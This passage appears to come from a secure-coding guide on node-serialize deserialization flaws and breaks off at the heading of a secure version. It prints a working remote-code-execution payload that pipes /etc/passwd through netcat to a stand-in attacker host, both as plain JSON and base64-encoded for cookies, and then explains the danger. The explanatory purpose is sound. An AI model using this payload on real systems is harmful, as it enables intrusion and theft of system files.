{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd | nc attacker.com 4444')}()"}

// Base64 encoded version often used in cookies
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY2F0IC9ldGMvcGFzc3dkIHwgbmMgYXR0YWNrZXIuY29tIDQ0NDQnKX0oKSJ9
```

**Why This Is Dangerous**:
- node-serialize can deserialize and execute JavaScript functions
- The `_$$ND_FUNC$$_` marker triggers automatic function execution
- Attacker gains full remote code execution with server privileges
- Can read files, establish reverse shells, pivot to other systems

**SECURE VERSION**:

```javascript
